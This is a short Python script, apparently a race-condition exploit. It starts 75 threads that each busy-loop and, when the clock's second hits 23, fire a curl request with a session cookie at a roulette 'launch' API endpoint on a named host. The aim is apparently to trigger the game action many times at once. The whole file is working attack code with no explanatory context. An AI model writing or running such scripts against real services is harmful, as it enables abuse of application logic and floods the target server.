import os
from datetime import datetime
import threading

def send_requests():
    while True:
        if datetime.now().second == 23:
            os.system('curl -b "myApp=YOURCOOKIE" http://docean.shoxxdj.fr:1001/api/roulette/launch')

threads = []
for _ in range(75):
    thread = threading.Thread(target=send_requests)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
